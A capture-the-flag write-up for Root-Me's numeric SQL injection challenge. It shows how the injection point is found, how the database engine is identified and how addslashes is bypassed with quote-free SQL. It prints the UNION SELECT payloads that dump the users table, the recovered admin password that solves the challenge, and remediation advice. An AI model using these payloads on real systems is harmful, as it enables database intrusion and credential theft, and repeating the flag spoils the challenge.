# Root-Me — Web-Server: "SQL injection - Numeric" (ch18)

**Target:** http://challenge01.root-me.org/web-serveur/ch18/
**Author:** g0uZ · **Points:** 35 · **CMS v0.01**
**Objective:** retrieve the administrator password.

## Result

```
ADMIN / VALIDATION PASSWORD: aTlkJYLjcbLmue3
```

Verified end to end by authenticating to the app's own login form.

## Step 1 — Finding the injection point

The index page links three news items:

```
./?action=news&news_id=1
```

`news_id` is a **numeric** parameter — no quotes required to break out of the context.
The classic boolean probe confirms it:

| Payload | Response |
|---|---|
| `1` | news item 1 |
| `1 AND 1=1` | news item 1 |
| `1 AND 1=2` | *(empty — no news rendered)* |
| `0 OR 1=1` | **all three news items** |

The `AND 1=2` vs `OR 1=1` differential is definitive: the parameter is injected raw into
the `WHERE` clause.

## Step 2 — Backend fingerprint

A stray quote produces a full PHP warning rather than a blank page:

```
GET ?action=news&news_id=1'
-> Warning : SQLite3::query(): Unable to prepare statement: 1,
   unrecognized token: "\" in /challenge/web-serveur/ch18/index.php on line 80
```

Three useful facts fall out at once:

1. **Backend is SQLite3** (`SQLite3::query()`), later confirmed as version **3.31.1**
   via `UNION SELECT 1,sqlite_version(),3`.
2. The **absolute path** of the application leaks: `/challenge/web-serveur/ch18/index.php`.
3. Errors are displayed — no blind extraction needed.

## Step 3 — The escaping gotcha (and how to work around it)

That same error message is the important one. The unrecognised token is a **backslash**,
which means the application runs the input through `addslashes()`-style escaping:
`'` becomes `\'`. Any payload containing a quote therefore fails with
`unrecognized token: "\"`.

Rather than fight the escaping, **write SQL that needs no quotes at all**:

- **Drop the `WHERE` clause.** Dumping `sqlite_master` needs no string literal:
  ```
  ?action=news&news_id=0 UNION SELECT 1,name,3 FROM sqlite_master--
  ```
- **Build strings with `char()`** when a literal is unavoidable:
  `char(116,97,98,108,101)` is `'table'`.

This sidesteps the filter completely and is far more robust than quote-smuggling tricks.

## Step 4 — Column count

```
1 ORDER BY 3   -> ok
1 ORDER BY 4   -> Warning: 1st ORDER BY term out of range - should be between 1 and 3
```

Three columns. `UNION SELECT 1,2,3` renders columns 2 and 3 (column 1 feeds the news link).

## Step 5 — Schema recovery

```sql
0 UNION SELECT 1,name,3 FROM sqlite_master--
```

```
news    users
```

```sql
0 UNION SELECT 1,sql,3 FROM sqlite_master--
```

```sql
CREATE TABLE news(id INTEGER, title TEXT, description TEXT)
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
```

## Step 6 — Dumping the credentials

```sql
0 UNION SELECT 1,username,password FROM users--
```

| username | password | Year |
|---|---|---|
| **admin** | **aTlkJYLjcbLmue3** | 2005 |
| user1 | vUrpgAsCTX | 2006 |
| user2 | aFjRKx7j9d | 2008 |

The app loops over the result set, so all three rows come back in one request — no
`LIMIT`/`OFFSET` loop needed. Concatenation for a compact view:
`username||char(58)||password`.

## Step 7 — Verification

Logging in with the recovered credential, using the app's own form:

```bash
curl -s -d "login=admin&password=aTlkJYLjcbLmue3" "$B?action=login"
```

```
Welcome back admin !
Hi master ! To validate the challenge use this password
```

Control with a deliberately wrong password:

```
Error : no such user/password
```

The page masks the password in its output
(`<input type="password" value="******" disabled />`), so the **database value** is the
deliverable — which is exactly what the challenge asks for.

## Remediation

- **Use parameterised queries / prepared statements.** With `SQLite3::prepare()` and
  `bindValue()`, `news_id` becomes data and can never alter query structure. This alone
  eliminates the vulnerability.
- **Cast numeric parameters to int** (`(int)$_GET['news_id']`) as defence in depth.
- **Never rely on `addslashes()`** for SQL safety — it is not an escaper for SQLite and
  creates a false sense of security (as this challenge demonstrates: the escaping was
  present, and the injection still worked).
- **Disable `display_errors` in production.** The error output here leaked the backend
  engine *and* the application's filesystem path.
- Apply least privilege to the database user; a read-only account limits the blast radius
  of any injection that survives.

## Notes on the environment

Reachability and exploitation confirmed from Windows Git Bash via the sandbox HTTP proxy.
Unencoded `[`/`]` were not needed here, but spaces in payloads must be sent as `%20`
(or `+`) — a bare space produces an empty response.
